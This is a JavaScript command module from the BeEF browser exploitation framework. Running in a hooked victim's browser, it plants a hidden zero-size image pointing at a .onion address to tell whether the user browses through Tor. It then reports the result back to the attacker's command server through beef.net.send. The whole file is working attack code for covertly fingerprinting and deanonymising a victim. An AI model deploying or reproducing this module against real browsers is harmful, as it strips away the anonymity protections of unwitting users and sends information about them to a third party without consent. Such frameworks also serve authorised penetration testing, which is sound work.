//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	if (document.getElementById('torimg')) {
		return "Img already created";
	}

	var img = new Image();
	img.setAttribute("style","visibility:hidden");
	img.setAttribute("width","0");
	img.setAttribute("height","0");
	img.src = 'http://dige6xxwpt2knqbv.onion/wink.gif';
	img.id = 'torimg';
	img.setAttribute("attr","start");
	img.onerror = function() {
		this.setAttribute("attr","error");
	};
	img.onload = function() {
		this.setAttribute("attr","load");
	};

	document.body.appendChild(img);

	setTimeout(function() {
		var img = document.getElementById('torimg');	
		if (img.getAttribute("attr") == "error") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is not behind Tor');
		} else if (img.getAttribute("attr") == "load") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is behind Tor');
		} else if (img.getAttribute("attr") == "start") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser timed out. Cannot determine if browser is behind Tor');
		};
		document.body.removeChild(img);
		}, <%= @timeout %>);

});
